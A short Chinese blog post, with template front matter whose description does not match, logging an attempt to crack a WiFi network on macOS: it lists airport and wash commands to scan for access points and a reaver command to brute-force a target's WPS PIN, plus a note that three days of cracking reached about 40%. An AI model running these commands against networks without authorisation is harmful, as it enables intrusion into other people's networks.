---
layout: post
category : 技术
title: "macos中使用wifi破解"
description: "规范Blog中git流程"
tagline: "技术就是生产力"
tags : [技术,Linux,Blog ]

---


##相关命令

使用airport监听wifi

    sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport

    airport -s 


使用wash 监听wifi
 
    sudo wash -i en0[无线网卡模块]


使用reaver

    sudo reaver -i en0 -b bssid -vv  



__状态跟踪__

2015-01-29 开始进行破解

经过3天只完成了40%+,pin码尚未完成暴力破解

中间出现了pin crack error 导致进程异常退出 
